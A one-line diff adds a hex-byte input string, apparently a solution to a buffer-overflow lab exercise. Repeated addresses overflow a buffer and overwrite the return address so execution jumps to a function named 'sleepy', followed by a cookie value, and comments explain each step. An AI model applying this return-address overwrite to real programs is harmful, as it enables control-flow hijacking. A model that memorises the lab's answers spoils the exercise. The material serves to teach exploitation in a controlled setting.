@@ -1,0 +1,1 @@
+e1 91 04 08 e1 91 04 08 e1 91 04 08 e1 91 04 08 e1 91 04 08 e1 91 04 08 e1 91 04 08 e1 91 04 08 e1 91 04 08 e1 91 04 08 e1 91 04 08 90 91 04 08 /* repeats adress of dopey until buffer is overloaded and the return address is overwritten with the address of sleepy */ 11 11 11 11 34 e7 23 7b /* passes cookie to sleepy */
